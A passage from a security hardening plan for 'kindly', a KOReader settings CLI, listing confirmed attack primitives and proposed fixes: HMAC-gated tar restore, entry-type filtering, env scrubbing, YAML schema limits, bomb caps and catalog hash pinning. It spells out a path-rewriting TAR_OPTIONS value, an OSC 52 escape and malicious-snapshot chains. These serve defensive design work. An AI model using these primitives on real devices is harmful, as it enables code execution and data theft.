`classifyKey(c.path[0])`; if SECRET, render both `prev` and `next`
as `«REDACTED»` (or show only a hash prefix for diff-usefulness).
This is a unconditional fix — no flag opt-in — because the leak
channel is the dry-run user's own screenshot.

### 8.7 Rollback / restore / snapshot trust gate (S44 / S46 / S47 / S49 / S51)

**Sibling to §8.6 in scope.** §8.6 extends the setup-import trust
boundary to `apply`. §8.7 extends it to the three commands that
*ingest attacker-controlled tars*: `rollback`, `restore`, and the
producer side `snapshot` which — combined with restore — forms a
distribution channel (S47). Today every one of these commands runs
with zero classify.ts imports and zero trust metadata on the tar
payload.

**Attack surface confirmed open (all live-verified 2026-04-23):**

- **S44 (rollback).** `kindly rollback <attacker-dir>` with zero
  flags: settings overwrite + plugin + patch in one command.
  Output `✓ restored 3 plugin/patch file(s)` is misleading —
  "restored" framing masks first-touch attacker-code ingestion.
- **S46 (restore).** `kindly restore <attacker.tar.gz>` with zero
  flags: single-file attack artifact (strictly more distributable
  than S44's directory shape); same gate-free code-drop.
- **S47 (snapshot-as-distribution).** Attacker uses `kindly
  snapshot` on their compromised fixture → blessed-looking
  `kindly-snapshot-<ts>.tar.gz` → posts on forum → victim
  `kindly restore`s it → code fires. **kindly's own tooling is
  the attack framework; no custom tar construction needed.**
  Tars carry no origin metadata: a snapshot the user took
  yesterday and one from a forum post look identical to
  restore.
- **S49 (code-drop surface is ≥5 files, not 2).** KOReader loads
  settings files via `pcall(dofile, …)` — every Lua file in
  `SNAPSHOT_PATHS` is a code-drop surface. Live-demo'd with
  `defaults.custom.lua` (marker in 2s). Same primitive confirmed
  statically for `history.lua` (`readhistory.lua:110`) and
  `settings.reader.lua.old` (`luasettings.lua:37`). Any gate
  that enumerates "plugins/ + patches/" specifically is
  incomplete.
- **S50 (symlink entries bypass path-safety).**
  `isSafeRelativePath` validates entry paths only, not symlink
  targets. `listTarGz` (`tar -tzf`) hides file types. BSD tar
  extracts symlinks with target intact. Result: `kindly
  restore/rollback` is an arbitrary-symlink-creation primitive
  inside the victim's filesystem. Cross-install exfil confirmed
  (bridged settings file leaked non-SECRET values through
  `kindly diff`/`pull`). Moderate severity, info-disclosure + invariant
  break. Fold into §8.7 via a `tar -tvzf` mode-column check.
- **S51 (rollback accepts any directory).**
  `rollback.ts:73` `resolve(env.cwd, opts.snapshotDir)` with no
  anchor to `<cwd>/.kindly/{pre-import,pre-apply,pre-rollback,
  backups}/`. Any directory containing a file literally named
  `plugins-patches.tar.gz` is a valid rollback source; entry
  names pass `isSafeRelativePath`, extraction lands in
  koreaderRoot. Sibling primitive to S46 via a distinct command
  — social-engineering footprint "run `kindly rollback
  /tmp/dir` to undo your import". `--to <N>` path inherits the
  same primitive when `history.jsonl` has a forged entry
  (reader trusts every line verbatim; no HMAC, no schema
  anchoring).

**The minimum hardening shape.**

**Primary: HMAC'd snapshot marker keyed to a machine-local secret.**

- On first `kindly` run (or on `kindly init` / explicit setup),
  generate `~/.kindly/machine-hmac-key` — 32 random bytes,
  `chmod 600`, persist. This key never leaves the machine.
- `kindly snapshot` writes a `.kindly-snapshot-marker` file into
  the tar containing: `{ producer_fingerprint, created_at,
  file_digests[] }` HMAC'd with the machine-local key. The
  digests cover every Lua file in the archive (**full-tar
  coverage, per S49**).
- `kindly rollback` and `kindly restore` refuse tars without a
  valid marker. Error message: `"archive has no kindly-snapshot
  marker — it was not produced by kindly on this machine. To
  ingest an external snapshot, use --from-untrusted, which runs
  the full setup-import pipeline (scanner, catalog lookup,
  SENSITIVE/SECRET detectors)."`
- **Entry-type filter for all tar extraction (S50 / S52 defense).**
  Replace `listTarGz`'s `tar -tzf` with `tar -tvzf` and parse the
  mode column. Reject any entry whose mode character is `l`
  (symlink), `h` (hardlink), `p` (FIFO/named pipe), `c` (char
  device), `b` (block device), or anything other than `-`
  (regular file) / `d` (directory). Applies to both the HMAC'd-
  trusted and `--from-untrusted` paths — the type invariant must
  hold unconditionally. Closes S50 (symlink exfil), S52's FIFO
  DoS primitive against `kindly doctor`/scanner `readFileSync`
  calls, and the S52 hardlink gap which is currently masked by
  BSD tar's linkname rule on macOS but **not by any kindly-side
  defense** (untested on GNU tar / Linux-Kindle).
  Alternative: migrate extraction to an in-process tar reader
  with explicit entry-type filtering.
- `--from-untrusted` routes the tar through the same trust
  pipeline as `setup import`: scanner on every Lua file in the
  tar (not just plugins/), SENSITIVE-key detection on the
  contained `settings.reader.lua`, and the `--accept-plugins` /
  `--accept-patches` / `--accept-sensitive` flags required where
  the content triggers them.

**Why machine-local HMAC, not a universal signature.**

- Universal signatures would require key distribution / a trust
  root / a central authority — none of which kindly has or
  should have for a local CLI.
- Machine-local HMAC solves the S47 distribution channel
  cleanly: an attacker's snapshot won't have a marker valid on
  the victim's machine, so restore refuses by default. Users
  who legitimately want to move a snapshot between their own
  machines use `--from-untrusted` and accept the pipeline run.
- Copy-marker attacks are nullified by the machine-local key:
  attacker can't produce a valid HMAC without the victim's
  `~/.kindly/machine-hmac-key`.

**Companion: scrub env before `spawnSync("tar", …)`  (M-probe, 2026-04-23).**

All three `spawnSync("tar", …)` call sites in
`src/fs/archive.ts:64, 219, 233` inherit the full `process.env`.
macOS bsdtar (libarchive 3.7.4) ignores `TAR_OPTIONS` (verified:
only `TAPE` is read, bogus flags silently dropped), so the macOS
execution path is not exploitable today. **GNU tar on Linux reads
`TAR_OPTIONS`** — a malicious caller (or a compromised shell
rc / systemd unit) can set
`TAR_OPTIONS='--transform=s,.*,koreader/plugins/evil.koplugin/main.lua,'`,
and extraction rewrites entry paths *after* `listTarGz` /
`isSafeRelativePath` already validated the original listing.
`listTarGz` and `extractTarGz` disagree about the set of paths.
Every path-safety gate in §8.7's tar pipeline silently inverts.

The fix is a one-line change at each site:
`spawnSync("tar", args, { env: {}, encoding: "utf8" })` — or,
if locale preservation is wanted, pass an explicit allowlist
(`{ LANG, LC_ALL, LC_CTYPE, PATH }`) that drops
`TAR_OPTIONS`/`TAR_READER_OPTIONS`. Must ship with §8.7; an HMAC-
gated tar pipeline that extracts with attacker-influenced env is
still compromised.

**Secondary: `kindly snapshot` warning about tarred code.**

Current snapshot output warns only about plaintext secrets.
Add: `"archive contains <N> plugin file(s) and <M> patch
file(s) and <K> Lua settings file(s) — all are code that
executes on KOReader boot. Do not share this archive with
anyone you would not trust to run arbitrary code on your
device."` This complements the HMAC gate on the restore side
with a producer-side awareness nudge.

**Non-goal clarification: §8.6 does NOT cover this.** §8.6
shares the SENSITIVE detector between `apply` and `setup import`.
Rollback/restore operate on fat tars with Lua code files, not on
YAML settings — the SENSITIVE detector is the wrong tool. The
trust question on these paths is "did kindly produce this tar?"
not "does this settings payload contain code-exec keys?".

### 8.9 Restrictive permissions on `.kindly/` state (S53)

**Independent from the trust-gate work in §8.6–§8.7.** §8.6/§8.7
stop attacker-controlled bytes from writing into trusted
locations. §8.9 stops non-kindly readers from reading kindly's
state. Different axis, same root cause: kindly never calls
`chmod` / `umask`.

**The gap.** `mkdirSync` / `openSync` inherit the process umask
(default 022 on macOS, most Linux distros), so every file and
directory kindly creates under `.kindly/` lands world-readable
(755/644). Critically, `.kindly/backups/<ts>/settings.reader.lua`
is a byte-copy of pre-apply device state — `filterForYaml` is
NOT run on backups because the whole point of a backup is
byte-exact recovery. So every SECRET on device at backup time
sits in plaintext in a 644 file.

**The fix.** `chmod 0700` on `.kindly/` at creation, `chmod 0600`
on every file written inside. Call sites to patch:

- `src/fs/safeWrite.ts:76` — `mkdirSync` for backups dir
- `src/fs/safeWrite.ts:85` — `openSync` for `.tmp` file
- `src/history/writer.ts:143` — `mkdirSync` for `.kindly`
- `src/history/writer.ts:169` — `openSync` for `history.jsonl`
- `src/commands/rollback.ts:130` — `mkdirSync` for pre-rollback
- `src/lib/importSetup.ts` — pre-import dir creation
- `src/commands/restore.ts` — pre-restore dir creation

Simplest implementation: single helper `mkdirSecure(path)` and
`writeFileSecure(path, bytes)` wrappers in `src/fs/` that
set mode explicitly. Thread all `.kindly/`-rooted I/O through
them. Drop `process.umask(0o077)` at CLI entry as a
defense-in-depth fallback for any call that slips through.

**Why it's sibling of §8.7 not a subsidiary.** §8.7 is about
authenticating inbound tars (HMAC marker keyed to machine-local
secret). §8.9 is about restricting outbound perms on state we
already trust. Neither subsumes the other — you need both. An
attacker can harvest `.kindly/backups/*/settings.reader.lua`
without ever touching kindly's trust-ingestion surface.

### 8.10 Shared stdout sanitizer for filesystem-sourced strings (S55 / S65 / S66)

§8.3 covers **manifest identity fields** (strings inside `meta.*`).
S55 / S65 / S66 broaden the surface: strings sourced from the
filesystem itself — plugin directory basenames (doctor), unknown
settings key names (doctor), label field in history entries
(history render) — reach stdout with zero sanitization. OSC 52
clipboard-write (`\x1b]52;c;<base64>\x07`) and bidi controls
(U+202A–202E, U+2066–2069, U+200E–200F) pass through verbatim.

**Fix.** Single `stripControl(s: string): string` in `src/lib/tty.ts`:

- Strip C0 `0x00–0x1F` except `\n`/`\t`
- Strip C1 `0x80–0x9F`
- Strip Unicode bidi block (U+202A–202E, U+2066–2069, U+200E–200F)
- Strip DEL `0x7F`
- Cap display length per field

Call sites to route through it (beyond §8.3):

- `src/lib/doctor.ts:217` — unknown-keys `sample.join(", ")`
- `src/lib/doctor.ts:361, 380-381` — uncatalogued plugin basenames
- `src/commands/history.ts:112-117` — `e.label`
- `src/commands/setup.ts:280-293, 718-741` — meta echo path (extends §8.3)
- Every `renderChange` emitter for `Change.path[]` / value stringification

**JSON output must pre-sanitize, not rely on `JSON.stringify` escaping.**
`cat`'ing the JSON log file honors the control bytes even when
`stdout` would escape them. Apply `stripControl` to every string
before it enters the JSON value tree.

Extends §8.3 rather than duplicating; §8.3's identity-field
sanitizer becomes a caller of this helper.

### 8.11 history.jsonl trust layer (S63 / EE / Y-probe)

History is a three-way trust failure: entries aren't schema-validated,
aren't HMAC-signed, and the index-computation read-modify-write races
under concurrent writers.

**Fix (three components, one commit):**

1. **Zod `HistoryEntrySchema.strict()`** in `src/history/reader.ts`.
   Reject non-string `ts` (Y-probe crash), non-number `index`
   (EE/duplicate-index footprint), absent `cmd`, and paths outside
   `<cwd>/.kindly/`. Today `reader.ts:70` casts via `as HistoryEntry`
   — zero validation.

2. **HMAC each line with the machine-local key from §8.7.** Line
   format: `{entry}\t<hmac-hex>`. `findHistoryEntryByIndex` and
   `rollback --to N` verify before acting. Forged `history.jsonl`
   lines (S63 primitive) fail HMAC → rollback refuses. Reuses the
   machine-local key already provisioned for snapshot markers — no
   new secret management.

3. **`flock(LOCK_EX)` the history file** around the read-compute-
   index-then-append sequence (`writer.ts:148-169`). Closes EE's
   duplicate-index race. Alternative: migrate to UUID entry IDs
   computed at write time, with index lazily assigned at read.
   Lock is simpler — ships with §8.14 which needs flock anyway.

**Renderer guards** (defense in depth): render-time `typeof` checks
on every user-visible field so a malformed survivor entry can't
crash the displayer. §8.10 sanitizer covers the `label` field.

### 8.12 Parser & shape guards for settings.reader.lua (S59 / S60 / S64 / S71 / S73 / S76 / S77 / S79 / S80 / S82 / S83 / S84 / S85) — **P1 after S71/S79/S82/S85**

**Status upgraded 2026-04-24.** RRR probe confirmed S71: array
wrapping (`kosync: [{userkey: v}]`) and literal dotted-top-level
(`"kosync.userkey": v`) both bypass SECRET_PATHS / SENSITIVE_PATHS
classifiers. This section was P2 (parser DoS defense); S71 promotes
it to **P1 — SECRET filter integrity**.

**Fix.**

- **Non-plain-table top-level reject.** `parseSettingsFile` returns
  early with a typed error if `dofile` evaluates to anything other
  than a Lua table with string keys. Closes S59 (string top-level
  → kindly emits `0:j\n1:u\n…` character-soup into pull YAML).
- **Recursion-depth cap at `parseValue`.** Default cap 64, raise
  to 128 if any real-world snapshot needs more. Closes S60
  (~50k depth → V8 stack blown, DoS of every parser-using
  command). Applies to both reader and writer.
- **`plugins_disabled` shape guard in `mergeYamlIntoLua`**
  (`src/schema/yaml.ts:108-128`). Reject non-plain-object:
  `plugins_disabled: [SSH, terminal]` and `plugins_disabled: true`
  fail fast with `plugins_disabled must be a map of name → bool`.
  Closes S64 (array wholesale-replace silently re-enables every
  disabled plugin, including terminal).
- **Classifier path integrity (S71).** Three changes in
  `src/schema/classify.ts`:
  - `:248` and `:115`/`:188` — recurse into arrays when the
    array's elements could satisfy `SECRET_PATHS[0]` / parent
    path prefix. Drop `!Array.isArray(v)` short-circuit. Array
    elements inherit parent path.
  - `:158` `classifyKey` — consult `SECRET_PATHS` for any key
    string containing `.`; or, cleaner: add a single
    **input-shape normalizer** at YAML-load time in
    `src/schema/yaml.ts` that rewrites `{"kosync.userkey": v}`
    → `{kosync: {userkey: v}}` before any classifier sees it.
    Normalization is preferred — one check vs. scattering path
    awareness across every classifier call site.
  - Unit tests for both shapes against every entry in
    `SECRET_PATHS` + `SENSITIVE_PATHS`.

None of these are flag-gated; all are type-invariant violations
with no legitimate user case. S71 changes the stakes — without
the classifier fix, every other §8.1 / §8.4 / §8.6 gate can be
bypassed by reshaping the input.

- **Prototype-safe table allocation (S73).** At `src/lua/reader.ts:232`:

  ```ts
  const obj: Record<string, LuaValue> = Object.create(null);
  ```

  Removes the `__proto__` setter from the object entirely — the
  `obj["__proto__"] = val` assignment at `:257` now creates an
  own-key instead of swapping the prototype. Downstream
  `Object.entries(obj)` / `Object.keys(obj)` walks now include
  `__proto__` (and `constructor` if someone ships one); classifier,
  YAML emitter, and Lua writer all see the payload — which is
  exactly what we want (either it fires the SENSITIVE gate or
  round-trips honestly). Same mitigation handles `constructor`,
  `prototype`, `hasOwnProperty`, `toString` — no enumeration of
  unsafe keys needed. Alternative, if we prefer loud-reject over
  normalize-away: add `__proto__` / `constructor` / `prototype`
  to a small reserved-key set and `fail()` in `parseTable` on
  match. Either is a few lines; `Object.create(null)` is one.

- **UTF-8 BOM strip at `parseSettingsFile` entry (S76).**

  ```ts
  export function parseSettingsFile(src: string): LuaValue {
      if (src.charCodeAt(0) === 0xFEFF) src = src.slice(1);
      return new Parser(src).parseFile();
  }
  ```

  Matches LuaJIT behavior. Closes the BOM-edited-settings
  divergence — users with BOM-emitting editors see kindly work.

- **Cycle detection in Lua writer (S77 / S80).** `src/lua/writer.ts`
  `serializeTable` takes a `WeakSet<object>` parameter; throws on
  repeat visit; depth counter capped at 64 (symmetric with S60's
  reader-side cap). **Now P1, not defense-in-depth** — S80 probe
  confirmed the `yaml` library materializes actually-cyclic
  graphs from attacker YAML (`&a / *a` self-reference), reaching
  the writer via `kindly apply --file` / `kindly setup import`
  as a push-button DoS.

- **Input-shape normalizer at `parseYamlSafe` (S71 / S79).** Single
  chokepoint that runs before any classifier / merge / writer call.
  Three shape rewrites in one pass:

  1. **Merge-key resolution (S79).** `{"<<": T, k: v}` →
     `{...T, k: v}` (explicit key wins on collision — YAML 1.1
     semantics).
  2. **Dotted-literal promotion (S71c).** `{"kosync.userkey": v}`
     → `{kosync: {userkey: v}}`.
  3. **Array-wrap descent (S71a).** Recurse `normalize` into
     array elements so classifier walks reach values under
     arrays — pair with classify.ts:115/188/248 drop of the
     `!Array.isArray(v)` short-circuit.

  WeakSet cycle-guard at normalizer entry (S80): if the parser
  materialized a cycle, normalize a structured-clone copy or
  short-circuit on repeat visit. Otherwise the normalizer
  itself is DoS'd by cyclic YAML.

- **Pin YAML version to 1.2 in `parseYamlSafe` (S84).** One-line
  patch at `src/fs/yamlSafe.ts:42`:

  ```ts
  return yamlParseRaw(src, {
      maxAliasCount: MAX_ALIAS_COUNT,
      version: '1.2',
  });
  ```

  Attacker loses the `%YAML 1.1` primitive that would otherwise
  let them pick between "literal `<<` key" (1.2) and "flattened
  siblings" (1.1) parse trees. Pairs with the input-shape
  normalizer above: normalizer owns S71/S79 literal-`<<`
  handling; version pin ensures `<<` is **always** literal at
  the yaml-library layer. All three parse sites
  (`yaml.ts:96`, `unpack.ts:92`, `importSetup.ts:67`) inherit
  via the shared `parseYamlSafe` chokepoint.

- **Scanner escape-sequence decoding (S82).** Extend
  `stripCommentsOnly` in `src/setup/luaScan.ts:150-216` to decode
  `\xHH`, `\###`, and `\u{...}` in the not-stripped branch:

  ```ts
  if (ch === "\\" && !stripStrings) {
      const esc = source[i + 1];
      if (esc === "x" && isHex(source[i+2]) && isHex(source[i+3])) {
          out += String.fromCharCode(parseInt(source.slice(i+2, i+4), 16));
          i += 4; continue;
      }
      if (esc >= "0" && esc <= "9") { /* 1-3 decimal digits */ ... }
      if (esc === "u" && source[i+2] === "{") { /* parse until } */ ... }
      out += escapeTable[esc] ?? esc;
      i += 2; continue;
  }
  ```

  Must land **before or alongside W39** — W39's proposed trust-
  summary advisory relies on scanner findings; without decode,
  escape-evaded payloads produce silent "no sensitive imports"
  advisories. Concatenation and `string.char` byte-table assembly
  remain evadable (S3-class, dataflow limitation in docs/87 §2.2);
  escape-decode closes the cheapest single-literal evasion.

- **Reject non-plain-object YAML values at `parseYamlSafe` (S85).**
  `yaml@2.8.3` materializes `!!binary` → Buffer, `!!set` → Set,
  `!!timestamp` → Date, `!!omap` → Map. All of these pass kindly's
  current `!(v instanceof Map)` + `!Array.isArray(v)` shape-guards,
  entering object-branches with surprising semantics (`Buffer` in
  particular gets walked as a numeric-keyed byte table). Two-part
  defense:

  1. **Disable non-core tags at the parser.** Extend
     `parseYamlSafe` to pass a restricted schema:

     ```ts
     yamlParseRaw(src, {
         maxAliasCount: MAX_ALIAS_COUNT,
         version: '1.2',
         customTags: [],
         schema: 'failsafe',   // only !!map, !!seq, !!str — no binary/set/ts/omap
     });
     ```

     kindly's settings are strings/numbers/booleans/nested maps.
     The failsafe schema covers everything legitimate; the core
     schema's `!!binary`/`!!set`/`!!timestamp`/`!!omap` have no
     kindly use case.

  2. **Belt-and-suspenders typed-object reject post-parse.** Walk
     the parsed tree; throw on any `Buffer`/`Set`/`Date`/`Map`
     subtree with a typed error that points at the offending
     path. Catches the case where a future maintainer restores
     `schema: 'core'` without noticing.

  Combined with the input-shape normalizer, this closes the third
  parse-time bypass class (after literal-`<<` and dotted-literal):
  attacker can no longer smuggle typed objects through the
  classifier walks, and the 22× serialization amplification of
  `!!binary` → Lua numeric-keyed table is unreachable.

- **Safe-integer guard in Lua reader (S83).** At
  `src/lua/reader.ts:219`, after `Number(token)`:

  ```ts
  const n = Number(this.src.slice(start, this.pos));
  if (Number.isNaN(n)) this.fail("invalid number");
  if (isIntegerToken && !Number.isSafeInteger(n)) {
      this.fail(`integer literal ${this.src.slice(start, this.pos)} exceeds f64 safe range`);
  }
  return n;
  ```

  `isIntegerToken` = no `.` and no `e`/`E` in the slice.
  One-line defense-in-depth; matches LuaJIT semantics in the
  default build (both use f64) but fails loudly rather than
  silently corrupting if KOReader ever stores large integers.

### 8.13 EPHEMERAL tier split (S62)

`classify.ts` has one EPHEMERAL tier. Several EPHEMERAL keys carry
literal PII (`lastfile`, `lastdir`, `menu_search_string`,
`quote_deck_pos`, `LocalSend_last_update_check`). `--full` mental
model is "include more keys"; actual semantic silently widens to
"include more keys **including PII**".

**Fix.** Split EPHEMERAL into two sub-tiers:

- `EPHEMERAL_VOLATILE` — UI state that isn't PII (panel positions,
  toolbar toggles, last-used-unit). `--full` includes these.
- `EPHEMERAL_PII` — paths, queries, user-typed strings. `--full`
  excludes these by default. Require explicit `--full-pii`.

On `--full-pii` write, stderr warning listing the PII keys about
to land in YAML (same shape as the setup-import SENSITIVE
renderer). `--output`-targeted files inherit `chmod 0600` from
§8.9. Small scope, closes S62 without mental-model churn for
existing `--full` users (PII keys mostly weren't what people
wanted anyway).

### 8.14 Advisory lock + stamp-uniqueness on read-modify-write (S67 / S78)

`mergeYamlIntoLua` reads, mutates in memory, then writes — no
lock across the window. On Kindle the USB-mount invariant holds
(KOReader exited by construction while kindly runs). On
**macOS KOReader-on-desktop** — the live-head target adopted in
`project_kindly_koreader_live_head` memory — KOReader can write
the file between kindly's read and write, and the last-writer-
wins silently.

**Fix.** Advisory `flock(LOCK_EX)` around the read-modify-write
span in `mergeYamlIntoLua` and in every other kindly command
that does read-then-write on `settings.reader.lua` (apply, diff
dry-run… actually diff is pure read, so apply is the only
mutator). Use `proper-lockfile` if Bun's native `flock` binding
doesn't land cleanly; the sidecar file is fine under `.kindly/`.

Long-term follow-up: propose KOReader honor the same lock in
`luasettings.lua`. Out of kindly's scope for v0.11.2 but worth a
docs-level note so the lock file is discoverable.

**Companion: stamp-collision fix for concurrent backups (S78).**
Four sites use millisecond-ISO stamps as directory / filename
components without randomness — `safeWrite.ts:74`,
`snapshot.ts:59`, `restore.ts:120`, `importSetup.ts:712`.
Concurrent writers silently clobber. Append 3 random bytes (6 hex
chars) to every stamp:

```ts
const stamp = `${new Date().toISOString().replace(/[:.]/g, "-")}-${randomBytes(3).toString("hex")}`;
```

~1-in-16M collision per pair. `copyFileSync` → `copyFile` with
`COPYFILE_EXCL` + retry on `EEXIST` as a belt. Folds here because
the file-lock already serializes the hot path inside a single
process; the stamp fix handles cross-process and GUI/watch
concurrency where the lock is held briefly per operation but
stamps collide within the millisecond window.

**Second companion: `.kindly/history.jsonl` + `.kindly/trace.jsonl`
symlink guards (S74).** All three sites — `history/reader.ts:59`,
`history/writer.ts:169`, `cli/trace.ts:60` — route through
`openAppendSecure(path)` / `readFileSecure(path)` wrappers that
`lstat` before open and refuse symlinks. Same helper as S56/S70's
settings-read guards (§8.14 scope intersects §8.9's
`writeFileSecure`). Closes the append-oracle primitive: attacker
pre-seeding `.kindly/history.jsonl → /target` no longer redirects
mutation writes.

### 8.15 Stream-counting bomb cap (S68 / S75 / S85 / YY-probe / BBB-probe)

`readGzipSizes` trusts ISIZE, which is 32-bit → wraps at 4 GiB.
Confirmed bypass: 4.1 GiB bomb passes all three caps.

**Fix.** Replace `readGzipSizes` → `enforceSizeCaps` with a
streaming-decompress pipeline: pipe through `zlib`-native or
`spawn("gunzip", ["-c"])`, count bytes through a passthrough
sink, abort (kill child, delete partial output) once byte
`cap + 1` is observed. Authoritative — trailer-independent — and
handles arbitrarily-sized bombs.

Belt-and-suspenders: sum `tar -tvzf` entry sizes before extract
and reject if the sum exceeds the cap. In the YY probe the tar
header *did* honestly report 4.1 GiB, so even a cheap pre-check
on `tar -tvzf` output would have caught it. Keep the streaming
cap as the primary; tar-header sum is a secondary belt. Both
land with §8.7 since that section already owns the tar pipeline.

**Companion: reject multi-member gzip (S75 / BBB).** `gzip -l`
reports only the last member's ISIZE per RFC 1952 concat
semantics. BBB probe: 11-member archive reported 4 KB, true
uncompressed 70 KB (17× undercount). `tar -xzf` stops at the
first embedded tar EOF marker, so only CPU/memory DoS today — not
file-write amplification — but the stream-counting sink in the
primary fix already catches the real bytes if hit. Tight
complementary check: in `readGzipSizes`, scan the archive for
gzip magic `1f 8b` at any offset beyond byte 0 and refuse.
Legitimate `.tar.gz` workflows never produce multi-member
archives; pure-JS byte scan, zero dependency on the gzip binary's
output shape.

**Companion: YAML→Lua serialization cap (S85).** Orthogonal bomb
path: attacker YAML `!!binary "<base64>"` materializes as Buffer,
gets walked by `yamlToLua`'s plain-object branch, gets serialized
as `["N"] = NNN,\n` per byte → 22× YAML-source amplification,
29.8× Buffer-bytes amplification (live-confirmed: 7 MB YAML →
156 MB Lua). `parseYamlSafe`'s 10 MiB source cap × 22 = 220 MiB
theoretical output, well over the 100 MiB `extractTarGz` cap.
**This bomb path never passes through a tar/gzip pipeline** — it
exits `dumpSettingsFile` straight into `safeWrite`'s 6-step
atomic pipeline, writing to `settings.reader.lua` + `.old` +
`.kindly/backups/<ts>/settings.reader.lua` (~3× amplification
beyond the serialization output itself).

Two-part fix pairs with §8.12's typed-object reject at
`parseYamlSafe`:

1. **Primary: reject Buffer/Set/Date/Map at parse time** (§8.12
   above) — closes the amplification at the source.
2. **Belt: counting buffer in `dumpSettingsFile`.** Pass through
   a counting wrapper; abort with `SerializationBombError` at
   `SERIAL_CAP = 50 MiB` (matches archive-uncompressed ceiling).
   Catches any future typed-value path that bypasses the parse-
   time reject (e.g. a settings.reader.lua that already has a
   misshapen value from a prior attacker apply), and bounds the
   worst-case `safeWrite` footprint.

Without the §8.12 reject, the counting cap is reached after
~1.6 MB of attacker Buffer source (50 MiB / 30 amplification) —
still useful, but S85's parse-time reject is the clean fix.

### 8.16 SNAPSHOT_PATHS code-drop gate + `.old` sibling reject (S49 / GGG)

§8.7 currently mandates HMAC coverage for "every Lua file in the
archive (full-tar coverage, per S49)." GGG adds a concrete shape
to enforce in the `--from-untrusted` pipeline:

- **Reject `.kset`/tar archives that ship `settings.reader.lua.old`**
  unless `--accept-dot-old` (new flag, off by default). KOReader
  generates `.old` during its own atomic writes — no legitimate
  author packs one into a distribution. `.old` siblings in a
  `.kset` are prima facie suspect.
- **Scanner runs on every file in SNAPSHOT_PATHS that KOReader
  `dofile`s**, not just `plugins/*.lua` and `patches/*.lua`.
  Namely `defaults.custom.lua`, `history.lua`, `settings.reader.lua.old`,
  and `settings.reader.lua` itself (yes, the main settings file —
  `return {…}` is code; S59 shows non-table returns are an
  exploit primitive). If any fails the lexical scanner, the full
  import is a policy block under `--strict-imports`, an advisory
  under default mode.
- **Main-file validation extends to the `.old` sibling** when
  present: if the main file parses as a plain table, kindly
  validates that too; if the main returns `nil`/non-table, the
  `.old` is treated as the *actual* settings source and scanned /
  validated in its place (this matches KOReader's runtime
  semantics).

Folds into §8.7's `--from-untrusted` pipeline; no new command.

### 8.18 Bun cwd-trust — `bunfig.toml` hijack (S81) — **depends on upstream**

**No clean kindly-side fix exists.** Bun's documented behavior is
to load `./bunfig.toml` from cwd on every invocation, including
from compiled binaries (empirically verified 2026-04-24). Three
fix candidates tested live; two rejected (compile-to-binary,
`-c` override); one partial (cwd-forcing wrapper breaks
relative-path flags).

**Minimum to ship:**

1. **Shell wrapper that refuses to run if `./bunfig.toml` exists
   in cwd.** The `kindly` script (if distributed as a wrapper
   over `bun run src/cli.ts`) greps for `bunfig.toml` before
   exec and errors with: `"refusing to run: cwd contains
   bunfig.toml which Bun honors as preload config. cd to a
   directory you control."` Bypasses with `--allow-cwd-bunfig`
   for users who intentionally use it (rare).
2. **docs/87 threat-model callout.** Name cwd-trust as an
   explicit kindly assumption. "Never run kindly from `/tmp/`,
   freshly-cloned repos, or shared working directories." The
   same advisory applies to every Bun-based tool — kindly is
   the canary for a broader ecosystem issue.
3. **Upstream ask: Bun feature request for a suppress-bunfig
   mode.** `BUN_CONFIG_SKIP=1` or `bun run --no-config`. Until
   this lands, no robust defense exists. File the issue;
   reference this scenario.

**Optional but worth considering:**

- **Move `kindly` to a compiled distribution** with the wrapper
  shell above. Still doesn't fix the bunfig-from-cwd issue
  (proven), but reduces exposure to "user ran `bun run
  kindly/src/cli.ts`" paths by making that invocation less
  canonical.
- **Canary preload.** Ship a kindly-side preload that runs
  very early and refuses to proceed if any *other* preload
  was registered. Defense-in-depth only — attacker preload
  already ran by the time kindly's check runs. More useful as
  telemetry ("did anyone attack via bunfig?") than prevention.

This section is deliberately separate from §8.17 because the
fix model is different: §8.17 is a local integrity check kindly
owns entirely; §8.18 is an upstream design issue kindly can
only work around. Both must be in the v0.11.2 scope — §8.17 for
the trust pyramid, §8.18 for the execution-substrate trust
assumption.

### 8.17 Catalog + schema file integrity (S72) — **P0, top of trust pyramid**

AAA-probe 2026-04-24 confirmed: a single-file swap of
`data/catalog/plugins.bundled.v1.json` inverts the W32 MATCH
gate, silences the W34e scanner, and beats `--strict-imports`
— with zero UI surface firing. **Every other hardening item in
§8 presupposes this gate holds.** If the catalog is
attacker-controlled, §8.1 SENSITIVE expansion, §8.2 patch hash
pinning, §8.6 shared SENSITIVE detector, and §8.7 HMAC marker
all operate on forged ground truth.

**Fix (preferred — compile-time embedded hash).**

Add a constant in `src/catalog/reader.ts`:

```ts
const CATALOG_SHA256_EXPECTED = "sha256:…";  // updated by build step
```

Loader check at `:123`:

```ts
const bytes = readFileSync(p);
const actual = `sha256:${createHash("sha256").update(bytes).digest("hex")}`;
if (actual !== CATALOG_SHA256_EXPECTED) {
    throw new KindlyError(
        ErrorCodes.CATALOG_INTEGRITY_FAIL,
        `catalog at ${p} has unexpected hash`,
        [{ text: "Reinstall kindly from a trusted source." }],
    );
}
```

Build step: `scripts/embed-catalog-hash.ts` recomputes the hash
whenever `data/catalog/plugins.bundled.v1.json` changes and
patches the constant. Same rig as `scripts/extract-plugin-meta.ts`.
Unit test verifies the constant matches the committed catalog.
Attacker modifying the catalog must also modify a `.ts` file —
which is code-exec-equivalent (Bun compiles at runtime), so the
attack collapses to "attacker already has RCE."

**Same treatment for `data/schemas/settings.reader.lua.v1.json`
via `src/schema/settings.ts:41-48`.** Lower severity than
catalog (SECRET/SENSITIVE lists are hardcoded in classify.ts
source, not derived from the schema), but type-mismatch
detection depends on the schema being honest. Bundle one fix
covering both files.

**Tradeoff: the release process now signs catalog updates.**
Release engineer regenerates → build step re-embeds hash →
commit includes both JSON and .ts delta. Routine for any
release with catalog changes; non-issue for point releases
that don't touch catalog.

**Secondary defense (post-install tampering only):** on first
run, write `~/.kindly/install-integrity.json` (chmod 0600 via
§8.9) containing catalog SHA at install. Compare every load.
Catches post-install tampering but **does not defend supply-
chain** (the install-time bytes may have been owned upstream).
Preferred fix already covers supply-chain; this is a weaker
layer that's useful only if the preferred fix is not feasible.

Must ship with or **before** any §8.1-§8.16 work — otherwise
every downstream gate is inverted.

### 8.8 Summary: the hardening patch in one paragraph

"Expand SENSITIVE_KEYS to cover `terminal_shell` and the unlisted
`*_dir` cluster. Classify `plugins_disabled` enables as SENSITIVE
generically. Gate patches under strict mode with per-file hash pins.
Sanitize manifest identity fields through the same escaper settings
values already use, and **extend that sanitizer to every
filesystem-sourced string reaching stdout (plugin basenames, key
names, history labels) to close the OSC 52 clipboard-write and the
bidi-override spoofing surfaces.** Promote type-mismatch from
